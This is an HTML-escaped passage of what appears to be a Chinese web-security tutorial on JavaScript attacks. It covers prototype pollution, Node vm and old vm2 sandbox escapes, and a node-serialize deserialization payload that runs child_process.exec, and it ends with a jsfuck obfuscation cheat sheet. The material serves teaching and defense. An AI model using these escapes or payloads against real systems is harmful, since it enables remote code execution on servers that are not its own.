punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token function&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;__proto__ &lt;span class=&#34;token operator&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这段代码会返回 true。说明我们步骤 2 是正确的。&lt;/p&gt;
&lt;h2 id=&#34;示例&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#示例&#34;&gt;#&lt;/a&gt; 示例&lt;/h2&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;token function-variable function&#34;&gt;Person&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function-variable function&#34;&gt;sayName&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    &lt;span class=&#34;token function&#34;&gt;alert&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;My Name is Jacky&#34;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;prototype&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;age &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token number&#34;&gt;27&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; p &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;token class-name&#34;&gt;Person&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;p&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;sayName&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;p 是一个引用指向 Person 的对象。我们在 Person 的原型上定义了一个 sayName 方法和 age 属性，当我们执行 p.age 时，会先在 this 的内部查找（也就是构造函数内部），如果没有找到然后再沿着原型链向上追溯。&lt;/p&gt;
&lt;p&gt;这里的向上追溯是怎么向上的呢？这里就要使用  &lt;code&gt;__proto__&lt;/code&gt;  属性来链接到原型（也就是 Person.prototype）进行查找。最终在原型上找到了 age 属性。&lt;/p&gt;
&lt;h2 id=&#34;原型链污染&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#原型链污染&#34;&gt;#&lt;/a&gt; 原型链污染&lt;/h2&gt;
&lt;p&gt;如前文提到的，JavaScript 是动态继承，通过  &lt;code&gt;__proto__&lt;/code&gt;  修改自身对象时会影响到有相同原型的对象。因此当键值对是用户可控的情况下，就可能出现原型链污染。&lt;/p&gt;
&lt;h1 id=&#34;沙箱逃逸&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#沙箱逃逸&#34;&gt;#&lt;/a&gt; 沙箱逃逸&lt;/h1&gt;
&lt;h2 id=&#34;前端沙箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#前端沙箱&#34;&gt;#&lt;/a&gt; 前端沙箱&lt;/h2&gt;
&lt;p&gt;在前端中，可能会使用删除  &lt;code&gt;eval&lt;/code&gt;  ，重写  &lt;code&gt;Function.prototype.constructor&lt;/code&gt;  /  &lt;code&gt;GeneratorFunction&lt;/code&gt;  /  &lt;code&gt;AsyncFunction&lt;/code&gt;  等方式来完成前端的沙箱。在这种情况下，可以使用创建一个新 iframe 的方式来获取新的执行环境。&lt;/p&gt;
&lt;h2 id=&#34;服务端沙箱&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#服务端沙箱&#34;&gt;#&lt;/a&gt; 服务端沙箱&lt;/h2&gt;
&lt;p&gt;JavaScript 提供了原生的 vm 模块，用于隔离了代码上下文环境。但是在该环境中依然可以访问标准的 JavaScript API 和全局的 NodeJS 环境。&lt;/p&gt;
&lt;p&gt;在原生的沙箱模块中，常用的逃逸方式为：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; vm &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;vm&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; sandbox &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;const&lt;/span&gt; whatIsThis &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; vm&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;runInNewContext&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token template-string&#34;&gt;&lt;span class=&#34;token template-punctuation string&#34;&gt;`&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    const ForeignObject = this.constructor;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    const ForeignFunction = ForeignObject.constructor;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    const process = ForeignFunction(&#34;return process&#34;)();&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    const require = process.mainModule.require;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;8&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;    require(&#34;fs&#34;);&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;9&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;/span&gt;&lt;span class=&#34;token template-punctuation string&#34;&gt;`&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; sandbox&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;考虑到 JavaScript 原生 vm 模块的缺陷，有开发者设计了 vm2 来提供一个更安全的隔离环境，但是在旧版本中同样存在一些逃逸方式，例如：&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;vm&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;runInNewContext&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token string&#34;&gt;&#39;Promise.resolve().then(()=&gt;&amp;#123;while(1)console.log(&#34;foo&#34;, Date.now());&amp;#125;); while(1)console.log(Date.now())&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token literal-property property&#34;&gt;console&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;apply&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;console&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;arguments&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;  &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&#34;token literal-property property&#34;&gt;timeout&lt;/span&gt;&lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt;&lt;span class=&#34;token number&#34;&gt;5&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h1 id=&#34;反序列化&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#反序列化&#34;&gt;#&lt;/a&gt; 反序列化&lt;/h1&gt;
&lt;h2 id=&#34;简介-4&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#简介-4&#34;&gt;#&lt;/a&gt; 简介&lt;/h2&gt;
&lt;p&gt;JavaScript 本身并没有反序列化的实现，但是一些库如 node-serialize、serialize-to-js 等支持了反序列化功能。这些库通常使用 JSON 形式来存储数据，但是和原生函数 JSON.parse、 JSON.stringify 不同，这些库支持任何对象的反序列化，特别是函数，如果使用不当，则可能会出现反序列化问题。&lt;/p&gt;
&lt;h2 id=&#34;payload构造&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload构造&#34;&gt;#&lt;/a&gt; Payload 构造&lt;/h2&gt;
&lt;p&gt;下面是一个最简单的例子，首先获得序列化后的输出&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; y &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function-variable function&#34;&gt;rce&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;:&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;child_process&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;ls /&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;token keyword&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token parameter&#34;&gt;error&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stdout&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt; stderr&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#123;&lt;/span&gt; console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;stdout&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt; &lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;,&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token punctuation&#34;&gt;&amp;#125;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; serialize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node-serialize&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;7&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;console&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;log&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#34;Serialized: \n&#34;&lt;/span&gt; &lt;span class=&#34;token operator&#34;&gt;+&lt;/span&gt; serialize&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;y&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;上面执行后会返回&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;&amp;#123;&amp;quot;rce&amp;quot;:&amp;quot;_$$ND_FUNC$$_function ()&amp;#123;require(&#39;child_process&#39;).exec(&#39;ls /&#39;, function(error, stdout, stderr) &amp;#123; console.log(stdout) &amp;#125;);&amp;#125;&amp;quot;&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;不过这段 payload 反序列化后并不会执行，但是在 JS 中支持立即调用的函数表达式（Immediately Invoked Function Expression），比如  &lt;code&gt;(function () &amp;#123; /* code */ &amp;#125; ());&lt;/code&gt;  这样就会执行函数中的代码。那么可以使用这种方法修改序列化后的字符串来完成一次反序列化。最后的 payload 测试如下:&lt;/p&gt;
&lt;figure class=&#34;highlight javascript&#34;&gt;&lt;figcaption data-lang=&#34;javascript&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; serialize &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token function&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;token string&#34;&gt;&#39;node-serialize&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;&lt;span class=&#34;token keyword&#34;&gt;var&lt;/span&gt; payload &lt;span class=&#34;token operator&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;token string&#34;&gt;&#39;&amp;#123;&#34;rce&#34;:&#34;_$$ND_FUNC$$_function ()&amp;#123;require(\&#39;child_process\&#39;).exec(\&#39;ls /\&#39;, function(error, stdout, stderr) &amp;#123; console.log(stdout) &amp;#125;);&amp;#125;()&#34;&amp;#125;&#39;&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;serialize&lt;span class=&#34;token punctuation&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;token function&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;(&lt;/span&gt;payload&lt;span class=&#34;token punctuation&#34;&gt;)&lt;/span&gt;&lt;span class=&#34;token punctuation&#34;&gt;;&lt;/span&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;h2 id=&#34;payload构造-ii&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#payload构造-ii&#34;&gt;#&lt;/a&gt; Payload 构造 II&lt;/h2&gt;
&lt;p&gt;以上提到的是 node-serialize 这类反序列化库的构造方式，还有一类库如 funcster，是使用直接拼接字符串构造函数的方式来执行。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;return &amp;quot;module.exports=(function(module,exports)&amp;#123;return&amp;#123;&amp;quot; + entries + &amp;quot;&amp;#125;;&amp;#125;)();&amp;quot;;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这种方式可以使用相应的闭合来构造 payload。&lt;/p&gt;
&lt;h1 id=&#34;jsfuck-cheat-sheet&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#jsfuck-cheat-sheet&#34;&gt;#&lt;/a&gt; jsfuck cheat sheet&lt;/h1&gt;
&lt;h2 id=&#34;basic-values&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#basic-values&#34;&gt;#&lt;/a&gt; Basic values&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;undefined&lt;/code&gt;  &amp;gt;  &lt;code&gt;[][[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;false&lt;/code&gt;  &amp;gt;  &lt;code&gt;![]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;true&lt;/code&gt;  &amp;gt;  &lt;code&gt;!![]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;NaN&lt;/code&gt;  &amp;gt;  &lt;code&gt;+[![]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;0&lt;/code&gt;  &amp;gt;  &lt;code&gt;+[]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;1&lt;/code&gt;  &amp;gt;  &lt;code&gt;+!+[]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;2&lt;/code&gt;  &amp;gt;  &lt;code&gt;!+[]+!+[]&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;basic-strings&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#basic-strings&#34;&gt;#&lt;/a&gt; Basic strings&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;&#39;&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+[]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;undefined&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+[][[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;false&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+![]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;true&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+!![]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;NaN&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+(+[![]])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;0&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+(+[])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;1&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+(+!+[])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;2&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[]+(!+[]+!+[])&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;10&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[+!+[]]+[+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;11&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[+!+[]]+[+!+[]]&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;&#39;100&#39;&lt;/code&gt;  &amp;gt;  &lt;code&gt;[+!+[]]+[+[]]+(+[])&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
